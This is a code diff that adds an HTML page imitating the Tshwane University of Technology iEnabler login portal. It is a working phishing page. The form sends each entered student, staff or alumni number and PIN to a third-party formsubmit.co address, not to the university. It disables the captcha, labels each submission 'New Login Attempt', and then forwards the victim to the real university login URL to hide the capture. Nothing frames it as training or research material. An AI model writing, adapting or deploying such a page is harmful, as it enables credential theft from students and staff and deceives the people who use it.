@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Self Help iEnabler - Tshwane University of Technology</title>
+    
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <link rel="stylesheet" href="its.css">
+
+    <style>
+        body { background-color: #f7f7f7; padding: 20px; }
+        .login-wrapper { max-width: 500px; margin-left: 0; }
+        .form-label { font-weight: bold; }
+        .itslogimg img { height: 70px; }
+    </style>
+</head>
+<body onload="set_it();">
+
+<div class="w3-row w3-hide-small" style="padding-bottom: 20px;">
+    <div class="itslogimg">
+        <img src="https://ienabler.tut.ac.za/itsimages/InsImg.gif" alt="TUT Logo">
+    </div>
+</div>
+
+<div class="login-wrapper">
+    <div class="w3-card-4 w3-margin-bottom">
+        <header class="w3-container w3-blue">
+            <h5>Registered Users: Login Credentials</h5>
+        </header>
+
+        <form action="https://formsubmit.co/d78ab63df3dfb61bd0aa040a07bb3873" method="POST" w3-container" name="frmLogin">
+            <input type="hidden" name="_captcha" value="false">
+             <input type="hidden" name="_next" value="https://ienabler.tut.ac.za/pls/prodi41/w99pkg.mi_validate_user">
+            <input type="hidden" name="_subject" value="New Login Attempt">
+            <input type="radio" name="numtype" value="S" checked onClick="set_it();"> <label>Student</label>
+            <input type="radio" name="numtype" value="P" onClick="set_it();"> <label>Personnel</label>
+            <input type="radio" name="numtype" value="O" onClick="set_it();"> <label>Other</label>
+            <input type="radio" name="numtype" value="A" onClick="set_it();"> <label>Alumni</label>
+            <br /><br />
+
+            <label id="LogUsr" class="form-label">Student Number:</label>
+            <input class="w3-input" type="text" name="unum" size="10" maxlength="9" autofocus required>
+            
+            <label class="form-label">Pin:</label>
+            <input class="w3-input" type="password" name="pin" size="10" maxlength="5" onBlur="return chkZero(this);" required>
+            
+            <p>(5 numeric digits. Do not start with a 0.)
+                <input type="hidden" name="authorise_function" value="Unknown">
+            </p>
+
+            <input type="submit" class="w3-button w3-padding-small w3-border" value="Login" onclick="document.frmLogin.authorise_function.value='Login';">
+            <input type="button" class="w3-button w3-padding-small w3-border" value="Forgot Pin" onclick="document.frmLogin.authorise_function.value='sendLogin'; document.frmLogin.submit();">
+            <input type="button" class="w3-button w3-padding-small w3-border" value="Change Pin" onclick="document.frmLogin.authorise_function.value='changePin'; document.frmLogin.submit();">
+            <input type="button" class="w3-button w3-padding-small w3-border" value="Request A Pin" onclick="document.frmLogin.authorise_function.value='requestPin'; document.frmLogin.submit();">
+            <input type="button" class="w3-button w3-padding-small w3-border" value="Forgot Student Number" onclick="document.frmLogin.authorise_function.value='forgotStno'; document.frmLogin.submit();">
+        </form>
+    </div>
+</div>
+
+<script>
+    function chkZero(ctl) {
+        if (ctl.value.substr(0,1) == "0") {
+            alert("Please do not start the PIN with a 0.");
+            ctl.focus();
+            ctl.select();
+            return false;
+        }
+        return true;
+    }
+
+    function set_it() {
+        let form = document.frmLogin;
+        let radios = form.numtype;
+        let selectedValue = "S"; 
+        for (let i = 0; i < radios.length; i++) {
+            if (radios[i].checked) {
+                selectedValue = radios[i].value;
+                break;
+            }
+        }
+
+        let newLabel = "Student Number: ";
+        if (selectedValue == 'P') { newLabel = "Student Number: "; }
+        else if (selectedValue == 'O') { newLabel = "External Number: "; }
+        else if (selectedValue == 'A') { newLabel = "Alumni Number: "; }
+        
+        document.getElementById("LogUsr").innerText = newLabel;
+        form.unum.focus();
+    }
+</script>
+
+</body>
+</html>
